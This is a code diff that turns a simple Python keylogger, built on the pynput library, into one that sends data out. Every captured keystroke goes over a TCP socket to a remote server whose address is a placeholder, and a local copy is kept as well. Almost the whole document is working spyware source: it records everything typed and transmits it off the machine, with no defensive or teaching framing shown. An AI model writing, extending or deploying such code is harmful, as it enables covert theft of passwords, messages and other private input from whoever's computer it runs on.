@@ -1,17 +1,40 @@
 from pynput import keyboard
+import socket
 
-log_file = "keystrokes_saved.txt" #The file where all the logged key presses will be saved
+log_file = "keystrokes_saved.txt" 
+
+SERVER_IP = '192.168.1.100'  # Replace with your server's IP address
+SERVER_PORT = 9999           # Replace with your server's port
+
+try:
+    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    target_socket.connect((SERVER_IP, SERVER_PORT))
+    
+except Exception as e:
+    target_socket = None  
+    with open("debug_log.txt", 'a') as debug_file:
+        debug_file.write(f"Connection error: {e}\n")
+
 
 def on_key_press(key):
     try:
-        with open(log_file, 'a') as f: #Open the file in append mode ('a') so new key presses are added to the file without overwriting existing content.
-            if hasattr(key, 'char') and key.char: #Check if the key object has a 'char' attribute and ensure it contains a valid value. Ex.: a, b, 1, 2,etc.
-                f.write(f"{key.char}\n") #Write the character to the file, followed by a new line 
-            else:
-                f.write(f"{key}\n") #This writes special key strocks like Ctrl or Shift on the file 
-    
-    except Exception as e: #Print an error message if something goes wrong while logging the key press
-        print(f"Error logging key press: {e}")
+        key_data = f"{key.char}\n" if hasattr(key, 'char') and key.char else f"{key}\n"
+        with open(log_file, 'a') as f: 
+            f.write(key_data) 
+        if target_socket:
+            target_socket.send(key_data.encode('utf-8'))
+    except Exception as e:
+        with open("debug_log.txt", 'a') as debug_file:
+            debug_file.write(f"Error logging key press: {e}\n")
 
-with keyboard.Listener(on_press=on_key_press) as listener: #Set up and start a keyboard listener using the pynput library to monitor key presses
-    listener.join() #Keep the listener running to capture key presses until the program is stopped
+with keyboard.Listener(on_press=on_key_press) as listener: 
+    listener.join() 
+
+if target_socket:
+    try:
+        target_socket.send(b"[Keylogger Closed]\n")  
+        target_socket.close()  
+    except Exception as e:
+        with open("debug_log.txt", 'a') as debug_file:
+            debug_file.write(f"Error closing socket: {e}\n")
+    
